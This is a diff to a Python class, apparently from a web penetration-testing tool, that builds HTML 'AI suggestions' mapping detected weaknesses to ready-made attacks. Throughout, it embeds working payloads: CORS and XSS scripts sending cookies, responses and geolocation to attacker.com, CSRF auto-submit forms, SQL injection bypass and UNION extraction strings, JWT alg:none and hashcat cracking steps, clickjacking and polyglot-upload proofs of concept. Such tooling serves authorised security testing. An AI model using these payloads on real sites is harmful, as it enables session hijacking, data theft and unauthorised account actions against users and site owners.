@@ -1680,79 +1680,245 @@ class LiveBrowserInterceptor:
             suggestions_html += '<div style="color:#00aa88; text-align:center; padding:20px; font-style:italic; background:rgba(0,50,40,0.3); border:1px dashed #005544; border-radius:6px;">No dynamic correlations mapped yet. Continue exercising application state...</div>'
 
         # Generate Context-Aware AI Suggestions Based on Current Findings
+        # TYPE STRINGS must exactly match what _analyze_cdp_response / analyzer.scan() emit.
         specific_suggestions = {}
 
         for f in self.live_findings:
             t = f.get('type', '').upper()
-            
-            # --- CORS ---
-            if 'CORS_WILDCARD_ORIGIN' in t:
+
+            # ── CORS ─────────────────────────────────────────────────────────
+            if 'CORS_WILDCARD' in t:                    # CORS_WILDCARD
                 specific_suggestions['CORS_WILDCARD'] = {
-                    'title': '🚪 CORS Wildcard Abuse (*)',
+                    'title': '🚪 CORS Wildcard Abuse (Access-Control-Allow-Origin: *)',
                     'color': '#ff9900',
-                    'text': '- <strong>Vulnerability:</strong> `Access-Control-Allow-Origin: *`.<br>- <strong>Constraint:</strong> Browsers block credentials (cookies/Auth headers). Useful for exfiltrating unauthenticated public/internal API data.<br>- <strong>Exploit Code (Host on Attacker Server):</strong><br><pre style="background:#111; color:#ffcc66; padding:6px; border-radius:3px; overflow-x:auto;">&lt;script&gt;\n  fetch("TARGET_URL")\n    .then(r =&gt; r.text())\n    .then(d =&gt; fetch("https://attacker.com/log?d=" + btoa(d)));\n&lt;/script&gt;</pre>'
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Any origin can read responses from this API.<br>'
+                        '- <strong>Constraint:</strong> Browsers block credentials (cookies/Auth headers) with wildcard ACAO. '
+                        'Useful for exfiltrating unauthenticated or session-independent data.<br>'
+                        '- <strong>Exploit (host on attacker server):</strong><br>'
+                        '<pre style="background:#111;color:#ffcc66;padding:6px;border-radius:3px;overflow-x:auto;">'
+                        '&lt;script&gt;\n'
+                        '  fetch("TARGET_URL")\n'
+                        '    .then(r =&gt; r.text())\n'
+                        '    .then(d =&gt; fetch("https://attacker.com/log?d=" + btoa(d)));\n'
+                        '&lt;/script&gt;</pre>'
+                    )
                 }
-            elif 'CORS_NULL_ORIGIN' in t:
+            elif 'CORS_NULL' in t:
                 specific_suggestions['CORS_NULL'] = {
-                    'title': '🚪 CORS Null Origin Abuse (null)',
+                    'title': '🚪 CORS Null Origin Abuse',
                     'color': '#ff9900',
-                    'text': '- <strong>Vulnerability:</strong> `Access-Control-Allow-Origin: null`.<br>- <strong>Constraint:</strong> Allows authenticated requests if `Access-Control-Allow-Credentials: true` is set.<br>- <strong>Exploit Code (Data URI Iframe Sandbox):</strong><br><pre style="background:#111; color:#ffcc66; padding:6px; border-radius:3px; overflow-x:auto;">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" \\n  src="data:text/html,&lt;script&gt;\\n  var req = new XMLHttpRequest();\\n  req.onload = req.onerror = function() {{ \\n    fetch(\\\'https://attacker.com/log?d=\\\' + btoa(this.responseText));\\n  }};\\n  req.open(\\\'GET\\\', \\\'TARGET_URL\\\', true);\\n  req.withCredentials = true;\\n  req.send();\\n  &lt;/script&gt;"&gt;\\n&lt;/iframe&gt;</pre>'
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Server allows null origin — exploitable via sandboxed iframe.<br>'
+                        '- <strong>Exploit:</strong><br>'
+                        '<pre style="background:#111;color:#ffcc66;padding:6px;border-radius:3px;">'
+                        '&lt;iframe sandbox="allow-scripts" src="data:text/html,&lt;script&gt;\n'
+                        '  fetch(\'TARGET_URL\',{credentials:\'include\'})\n'
+                        '    .then(r=&gt;r.text())\n'
+                        '    .then(d=&gt;fetch(\'https://attacker.com/?d=\'+btoa(d)));\n'
+                        '&lt;/script&gt;"&gt;&lt;/iframe&gt;</pre>'
+                    )
                 }
 
-            # --- DOM Sinks ---
-            elif 'DOM_SINK_INNERHTML' in t:
-                specific_suggestions['INNERHTML'] = {
-                    'title': '🌐 DOM XSS: innerHTML & outerHTML',
-                    'color': '#00ffaa',
-                    'text': '- <strong>Vulnerability:</strong> Untrusted data flows into HTML parser.<br>- <strong>Constraint:</strong> `<script>` tags will NOT execute when injected via innerHTML. You must use element attributes/events.<br>- <strong>Standard Payloads:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;svg/onload=alert(1)&gt;</code><br>- <strong>WAF Evasion / Filter Bypasses:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;body onload=alert(1)&gt;</code> (If injecting near `<body>`)'
-                }
-            elif 'DOM_SINK_EVAL' in t or 'DOM_SINK_FUNCTION' in t or 'SETTIMEOUT' in t:
-                specific_suggestions['EVAL'] = {
-                    'title': '🌐 DOM XSS: JS Execution Contexts (eval / setTimeout)',
-                    'color': '#00ffaa',
-                    'text': '- <strong>Vulnerability:</strong> Data is passed directly to the JS runtime.<br>- <strong>Constraint:</strong> You need to break out of the current JS syntax (e.g., strings, function calls) without breaking the engine parser.<br>- <strong>String Breakouts:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">\");alert(1);//</code><br><code style="color:#66ffcc; background:#111; padding:2px;">\'-alert(1)-\'</code><br>- <strong>Direct Execution (if no surrounding quotes):</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">alert(1)</code>'
-                }
-
-            # --- Cookies ---
-            elif 'INSECURE_COOKIE_HTTPONLY' in t:
-                specific_suggestions['HTTPONLY'] = {
-                    'title': '🔑 Session Hijacking via Missing HttpOnly',
-                    'color': '#aa55ff',
-                    'text': '- <strong>Vulnerability:</strong> High-value cookie (e.g. session_id) lacks HttpOnly flag.<br>- <strong>Attack Vector:</strong> If you find an XSS vulnerability anywhere on this domain, you can steal this cookie via JS.<br>- <strong>XSS Exfiltration Payload:</strong><br><code style="color:#d499ff; background:#111; padding:2px;">fetch("https://attacker.com/steal?c=" + btoa(document.cookie))</code>'
-                }
-            elif 'INSECURE_COOKIE_SECURE' in t:
-                specific_suggestions['SECURE_COOKIE'] = {
-                    'title': '🔑 MitM Cookie Interception (Missing Secure)',
-                    'color': '#aa55ff',
-                    'text': '- <strong>Vulnerability:</strong> Cookie lacks the `Secure` flag.<br>- <strong>Attack Vector:</strong> If the user is on public Wi-Fi or subjected to network sniffing, and they make ANY plaintext HTTP request to the domain (even a redirect), the browser will leak this cookie in plaintext.<br>- <strong>Exploitation:</strong> Use tools like Bettercap or Wireshark to intercept the unencrypted HTTP traffic.'
-                }
-            elif 'INSECURE_COOKIE_SAMESITE' in t:
-                specific_suggestions['SAMESITE'] = {
-                    'title': '🔑 Cross-Site Request Forgery (Missing SameSite)',
-                    'color': '#aa55ff',
-                    'text': '- <strong>Vulnerability:</strong> Cookie lacks `SameSite=Lax` or `Strict`.<br>- <strong>Attack Vector:</strong> The browser will attach this session cookie to cross-site POST/GET requests initiated from an attacker site.<br>- <strong>Exploit Code (Host on Attacker Site):</strong><br><pre style="background:#111; color:#d499ff; padding:6px; border-radius:3px; overflow-x:auto;">&lt;form action="TARGET_STATE_CHANGING_URL" method="POST"&gt;\n  &lt;input type="hidden" name="email" value="attacker@email.com"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>'
-                }
-
-            # --- Injections ---
-            elif 'SQLI' in t or 'INJECTION' in t:
-                specific_suggestions['SQLI'] = {
-                    'title': '🔥 Database Injection & Exfiltration',
-                    'color': '#ff3333',
-                    'text': '- <strong>Authentication Bypass:</strong><br><code style="color:#ff6666; background:#111; padding:2px;">admin\' --</code><br><code style="color:#ff6666; background:#111; padding:2px;">\' OR 1=1--</code><br>- <strong>Time-Based Blind (Confirmation):</strong><br><code style="color:#ff6666; background:#111; padding:2px;">1\' AND SLEEP(5)--</code> (MySQL)<br><code style="color:#ff6666; background:#111; padding:2px;">1\'; WAITFOR DELAY \'0:0:5\'--</code> (MSSQL)<br><code style="color:#ff6666; background:#111; padding:2px;">1\' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--</code><br>- <strong>UNION-Based Exfiltration (Find Column Count First):</strong><br><code style="color:#ff6666; background:#111; padding:2px;">\' ORDER BY 1--</code> (Increment until error)<br><code style="color:#ff6666; background:#111; padding:2px;">\' UNION SELECT null, null, database(), user(), @@version--</code>'
-                }
-
-            # --- CSP ---
-            elif 'CSP_MISSING' in t:
+            # ── Missing Security Headers ──────────────────────────────────────
+            if 'MISSING_CONTENT_SECURITY_POLICY' in t or 'CSP_MISSING' in t or 'MISSING_CSP' in t:
                 specific_suggestions['CSP_MISSING'] = {
-                    'title': '🛡️ Missing Content Security Policy (No XSS Protection)',
+                    'title': '🛡️ No CSP — Any XSS is Fully Exploitable',
                     'color': '#00ffaa',
-                    'text': '- <strong>Vulnerability:</strong> No CSP header is present.<br>- <strong>Attack Vector:</strong> The browser will execute any inline script or load any external script. Any XSS vulnerability found is fully exploitable.<br>- <strong>Strategy:</strong> Focus heavily on finding Reflected or Stored XSS, as there is no secondary defense layer.'
+                    'text': (
+                        '- <strong>Vulnerability:</strong> No Content-Security-Policy header on any page.<br>'
+                        '- <strong>Impact:</strong> The browser executes ANY injected script — inline, external, or via data: URI.<br>'
+                        '- <strong>Attack Strategy:</strong> Prioritise finding Reflected/Stored XSS. '
+                        'Without CSP there is zero secondary defence.<br>'
+                        '- <strong>Classic Payloads:</strong><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;svg/onload=fetch(`https://attacker.com/?c=${document.cookie}`)&gt;</code>'
+                    )
                 }
-            elif 'CSP_UNSAFE_INLINE' in t or 'UNSAFE_INLINE' in t:
-                specific_suggestions['CSP_INLINE'] = {
-                    'title': '🛡️ CSP Bypass (unsafe-inline)',
+
+            if 'MISSING_X_FRAME_OPTIONS' in t or 'X_FRAME' in t:
+                specific_suggestions['XFRAME'] = {
+                    'title': '🖼️ Clickjacking — Missing X-Frame-Options',
+                    'color': '#ff9900',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Pages can be embedded in a &lt;iframe&gt; on an attacker site.<br>'
+                        '- <strong>Attack:</strong> Overlay a transparent iframe over a fake UI to trick users into clicking '
+                        'sensitive actions (fund transfers, account deletion, password change).<br>'
+                        '- <strong>PoC (Clickjacking Test):</strong><br>'
+                        '<pre style="background:#111;color:#ffcc66;padding:6px;border-radius:3px;">'
+                        '&lt;style&gt;iframe{opacity:0.5;position:absolute;top:0;left:0;width:100%;height:100%;z-index:99}&lt;/style&gt;\n'
+                        '&lt;iframe src="TARGET_URL"&gt;&lt;/iframe&gt;\n'
+                        '&lt;!-- If iframe loads, site is vulnerable --&gt;</pre>'
+                    )
+                }
+
+            if 'MISSING_X_CONTENT_TYPE' in t or 'X_CONTENT_TYPE' in t:
+                specific_suggestions['XCTO'] = {
+                    'title': '📄 MIME Sniffing — Missing X-Content-Type-Options',
+                    'color': '#ffcc00',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Browser may MIME-sniff responses and execute them differently.<br>'
+                        '- <strong>Attack Vector:</strong> If you can upload a file with polyglot content (e.g. an image that is '
+                        'also valid JS/HTML), the browser may execute it as script.<br>'
+                        '- <strong>Strategy:</strong> Test file upload endpoints with polyglot payloads:<br>'
+                        '<code style="color:#ffcc66;background:#111;padding:2px;">'
+                        'GIF89a/*&lt;script&gt;alert(1)&lt;/script&gt;*/</code><br>'
+                        '- Upload as image.gif — if served without nosniff, may execute as HTML in some browsers.'
+                    )
+                }
+
+            if 'MISSING_PERMISSIONS_POLICY' in t or 'PERMISSIONS_POLICY' in t:
+                specific_suggestions['PERMISSIONS'] = {
+                    'title': '🎤 Missing Permissions-Policy (Camera/Mic/Geolocation)',
+                    'color': '#ffcc00',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> No Permissions-Policy restricts browser APIs.<br>'
+                        '- <strong>Impact:</strong> Malicious iframes or XSS payloads can silently request '
+                        'camera, microphone, geolocation, or payment access.<br>'
+                        '- <strong>Combined with XSS:</strong><br>'
+                        '<code style="color:#ffcc66;background:#111;padding:2px;">'
+                        'navigator.geolocation.getCurrentPosition(p=&gt;fetch(`https://attacker.com/?lat=${p.coords.latitude}&amp;lng=${p.coords.longitude}`))'
+                        '</code>'
+                    )
+                }
+
+            if 'MISSING_REFERRER_POLICY' in t or 'REFERRER_POLICY' in t:
+                specific_suggestions['REFERRER'] = {
+                    'title': '🔗 Sensitive URL Leakage — Missing Referrer-Policy',
+                    'color': '#ffcc00',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> The full URL (including query params) is sent in the Referer header to external sites.<br>'
+                        '- <strong>Leak Scenarios:</strong><br>'
+                        '  • User visits /account?token=abc123 → clicks external link → token leaked in Referer<br>'
+                        '  • Password reset tokens, session IDs in URLs → leaked to third-party analytics<br>'
+                        '- <strong>Recommendation:</strong> Add <code>Referrer-Policy: strict-origin-when-cross-origin</code>'
+                    )
+                }
+
+            # ── JWT ───────────────────────────────────────────────────────────
+            if 'JSON_WEB_TOKEN' in t or 'JWT' in t:
+                specific_suggestions['JWT'] = {
+                    'title': '🔑 JWT Found — Test for Algorithm Confusion & Weak Secrets',
+                    'color': '#ff3333',
+                    'text': (
+                        '- <strong>Finding:</strong> JWT token detected in traffic/response.<br>'
+                        '- <strong>Test 1 — Algorithm: none attack:</strong><br>'
+                        '  Decode the JWT (base64), change <code>"alg":"HS256"</code> to <code>"alg":"none"</code>, '
+                        'strip the signature. If accepted → critical auth bypass.<br>'
+                        '- <strong>Test 2 — Weak secret brute-force:</strong><br>'
+                        '<code style="color:#ff6666;background:#111;padding:2px;">'
+                        'hashcat -a 0 -m 16500 &lt;jwt&gt; wordlist.txt</code><br>'
+                        '<code style="color:#ff6666;background:#111;padding:2px;">'
+                        'python3 jwt_tool.py &lt;jwt&gt; -C -d wordlist.txt</code><br>'
+                        '- <strong>Test 3 — RS256 → HS256 confusion:</strong> Sign with the server\'s public key '
+                        'as the HS256 secret → server may accept it.<br>'
+                        '- <strong>Tool:</strong> <a href="https://jwt.io" target="_blank" style="color:#4da6ff;">jwt.io</a> '
+                        '— jwt_tool, John the Ripper'
+                    )
+                }
+
+            # ── DOM XSS ───────────────────────────────────────────────────────
+            if 'INNERHTML' in t or 'OUTERHTML' in t:
+                specific_suggestions['INNERHTML'] = {
+                    'title': '🌐 Confirmed DOM XSS — innerHTML/outerHTML Sink',
                     'color': '#00ffaa',
-                    'text': '- <strong>Vulnerability:</strong> CSP allows `unsafe-inline` in script-src.<br>- <strong>Attack Vector:</strong> You don\\\'t need to host an external script. You can execute JS directly in the DOM.<br>- <strong>Payloads:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">javascript:alert(1)</code> (in `<a>` tags)'
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Untrusted data flows into HTML parser sink.<br>'
+                        '- <strong>Constraint:</strong> &lt;script&gt; tags do NOT execute via innerHTML. '
+                        'Use event-handler elements.<br>'
+                        '- <strong>Payloads:</strong><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;img src=x onerror=alert(document.domain)&gt;</code><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;svg/onload=alert(1)&gt;</code><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;details/open/ontoggle=alert(1)&gt;</code><br>'
+                        '- <strong>Cookie steal:</strong><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">'
+                        '&lt;img src=x onerror=fetch(`//attacker.com?c=${document.cookie}`)&gt;</code>'
+                    )
+                }
+
+            if 'FUNCTION_CTOR' in t or ('DOM_SINK' in t and 'FUNCTION' in t):
+                specific_suggestions['FUNCTION_CTOR'] = {
+                    'title': '🌐 Confirmed DOM XSS — Function() Constructor Sink',
+                    'color': '#00ffaa',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Data flows into <code>new Function()</code> — equivalent to eval().<br>'
+                        '- <strong>Payloads (break out of any surrounding string context):</strong><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">alert(1)</code> (direct injection)<br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">\\");alert(1);//</code> (string escape)<br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">\'}-alert(1)-x={</code> (object context)<br>'
+                        '- <strong>Data exfil:</strong><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">'
+                        'fetch(`https://attacker.com/?d=${btoa(document.cookie)}`)</code>'
+                    )
+                }
+
+            if ('DOM_SINK_EVAL' in t or 'SETTIMEOUT' in t or
+                    ('DOM_SINK' in t and 'EVAL' in t)):
+                specific_suggestions['EVAL'] = {
+                    'title': '🌐 DOM XSS — eval()/setTimeout() Execution Sink',
+                    'color': '#00ffaa',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Data passed to JS execution context.<br>'
+                        '- <strong>String breakouts:</strong><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">\\");alert(1);//</code><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">\'-alert(1)-\'</code><br>'
+                        '- <strong>No surrounding quotes:</strong><br>'
+                        '<code style="color:#66ffcc;background:#111;padding:2px;">alert(1)</code>'
+                    )
+                }
+
+            # ── Cookies ───────────────────────────────────────────────────────
+            if 'HTTPONLY' in t and 'COOKIE' in t:
+                specific_suggestions['HTTPONLY'] = {
+                    'title': '🔑 Cookie without HttpOnly — Session Hijacking via XSS',
+                    'color': '#aa55ff',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Session cookie readable by JavaScript.<br>'
+                        '- <strong>XSS steal payload:</strong><br>'
+                        '<code style="color:#d499ff;background:#111;padding:2px;">'
+                        'fetch("https://attacker.com/steal?c="+btoa(document.cookie))</code>'
+                    )
+                }
+            if 'SAMESITE' in t and 'COOKIE' in t:
+                specific_suggestions['SAMESITE'] = {
+                    'title': '🔑 Missing SameSite — CSRF Attack Surface',
+                    'color': '#aa55ff',
+                    'text': (
+                        '- <strong>Vulnerability:</strong> Session cookie sent on cross-site requests → CSRF possible.<br>'
+                        '- <strong>CSRF PoC:</strong><br>'
+                        '<pre style="background:#111;color:#d499ff;padding:6px;border-radius:3px;">'
+                        '&lt;form action="TARGET_ACTION_URL" method="POST"&gt;\n'
+                        '  &lt;input name="amount" value="9999"&gt;\n'
+                        '&lt;/form&gt;\n'
+                        '&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>'
+                    )
+                }
+
+            # ── Injection ─────────────────────────────────────────────────────
+            if 'SQLI' in t or ('INJECTION' in t and 'SQL' in t):
+                specific_suggestions['SQLI'] = {
+                    'title': '🔥 SQL Injection — Auth Bypass & Data Exfiltration',
+                    'color': '#ff3333',
+                    'text': (
+                        '- <strong>Auth bypass:</strong> <code style="color:#ff6666;background:#111;padding:2px;">admin\'--</code> '
+                        '/ <code style="color:#ff6666;background:#111;padding:2px;">\' OR \'1\'=\'1</code><br>'
+                        '- <strong>Time-based blind:</strong> <code style="color:#ff6666;background:#111;padding:2px;">1\' AND SLEEP(5)--</code><br>'
+                        '- <strong>UNION exfil (find column count first):</strong><br>'
+                        '<code style="color:#ff6666;background:#111;padding:2px;">\' ORDER BY 1--</code> (increment until error)<br>'
+                        '<code style="color:#ff6666;background:#111;padding:2px;">\' UNION SELECT null,database(),user(),@@version--</code>'
+                    )
+                }
+
+            # ── CSP misconfig ─────────────────────────────────────────────────
+            if 'CSP_UNSAFE_INLINE' in t or 'UNSAFE_INLINE' in t:
+                specific_suggestions['CSP_INLINE'] = {
+                    'title': '🛡️ CSP Bypass — unsafe-inline Allowed',
+                    'color': '#00ffaa',
+                    'text': ('- <strong>Impact:</strong> Inline scripts execute freely.<br>'
+                             '- <strong>Payloads:</strong><br>'
+                             '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><br>'
+                             '<code style="color:#66ffcc;background:#111;padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code>')
                 }
             elif 'CSP_UNSAFE_EVAL' in t or 'UNSAFE_EVAL' in t:
                 specific_suggestions['CSP_EVAL'] = {
